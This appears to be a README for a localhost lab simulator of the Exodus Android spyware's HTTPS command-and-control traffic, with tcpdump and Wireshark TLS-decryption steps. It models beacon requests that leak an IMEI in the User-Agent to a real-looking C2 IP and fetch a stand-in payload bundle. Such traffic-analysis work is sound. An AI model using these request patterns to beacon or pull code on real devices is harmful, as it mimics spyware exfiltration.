# Exodus T1407 HTTPS Simulator

## Run And Capture

Terminal 1:

```bash
cd outputs/exodus_t1407_https_sim
python3 server.py --bind 127.0.0.1 --port 8443
```

Terminal 2, start capture before the client:

```bash
sudo tcpdump -i lo -s 0 -w exodus_t1407_sim.pcap tcp port 8443
```

Terminal 3:

```bash
cd outputs/exodus_t1407_https_sim
python3 client.py --connect-host 127.0.0.1 --connect-port 8443 --keylog-file "$PWD/sslkeys.log"
```

The client must print:

```text
[client] TLS keylog enabled: .../sslkeys.log
[client] TLS established: TLSv1.2 ...
```

## Wireshark TLS Decryption

In Wireshark:

```text
Edit -> Preferences -> Protocols -> TLS
```

Set:

```text
(Pre)-Master-Secret log filename = /absolute/path/to/outputs/exodus_t1407_https_sim/sslkeys.log
```

Reload the PCAP after setting the file.

If Wireshark still does not decode it:

1. Check that `sslkeys.log` is not empty:

   ```bash
   wc -l sslkeys.log
   head sslkeys.log
   ```

   It should contain lines like `CLIENT_RANDOM ...`.

2. Make sure tcpdump started before the client. The PCAP must include the TLS handshake, especially `Client Hello`.

3. If using a non-standard port, force decode:

   ```text
   Analyze -> Decode As... -> TCP port 8443 -> TLS
   ```

4. Do not try to use the server private key in Wireshark. The session uses ECDHE, so RSA private-key decryption will not work. The correct method is the TLS key log file.

5. Do not run the client with `sudo` unless you preserve the environment or pass `--keylog-file`. Running `sudo tcpdump` is fine; running `sudo python3 client.py` can cause the keylog to be written somewhere unexpected.

6. If Wireshark shows decrypted TLS but not HTTP, right-click a decrypted TCP segment and try:

   ```text
   Decode As... -> HTTP
   ```

## What The Traffic Models

The client sends:

```http
POST /eddd0317-2bdc-4140-86cb-0e8d7047b874 HTTP/1.1
User-Agent: it.promofferte:<IMEI>
Content-Type: application/octet-stream
Content-Length: 256
Host: 54.71.249.137
Connection: Keep-Alive
Accept-Encoding: gzip
```

and then:

```http
POST /56e087c9-fc56-49bb-bbd0-4fafc4acd6e1 HTTP/1.1
```

Both bodies are real RSA/ECB/PKCS1Padding ciphertexts generated with the recovered Exodus `staging_key`. The second response is a benign ZIP shaped like the Exodus Two bundle.
